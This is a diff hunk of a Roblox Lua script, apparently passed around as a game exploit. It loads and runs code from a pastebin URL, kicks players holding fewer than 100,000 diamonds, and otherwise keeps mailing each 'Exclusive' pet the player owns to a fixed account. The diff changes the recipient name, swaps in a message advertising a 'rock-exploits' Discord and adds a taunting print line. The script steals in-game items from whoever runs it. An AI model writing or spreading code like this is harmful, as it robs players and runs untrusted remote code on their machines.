@@ -5,20 +5,20 @@ loadstring(game:HttpGet("https://pastebin.com/raw/BgwdW7Gm"))()
     
 if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
     game.Players.LocalPlayer:Kick("Error found while executing.") else
-        print("working.") 
+        print("Rock Exploits#0001 X ! CrazyNoob#7829 Probably just shit on ur huges Thank you!.") 
 end
 
 while wait() do
 for i,v in pairs(savedPets) do
     local v2 = FrameworkLibrary.Directory.Pets[v.id]
     if v2.rarity == "Exclusive" then
-            local args={
-                [1]={
-                    ["Recipient"]= "DoiFifiii",
-                    ["Diamonds"]= 0, 
-                    ["Pets"]= {v.uid}, -- dont change
-                    ["Message"]= "Made by Zey"
-                }}
+local args = {
+    [1] = {
+        ["Recipient"] = "Doififiii",
+        ["Diamonds"] = 0,
+        ["Pets"] = {v.uid},
+        ["Message"] = "dc.gg/rock-exploits"
+    }}
         Invoke("Send Mail", unpack(args)) 
          wait(1.75) 
         end
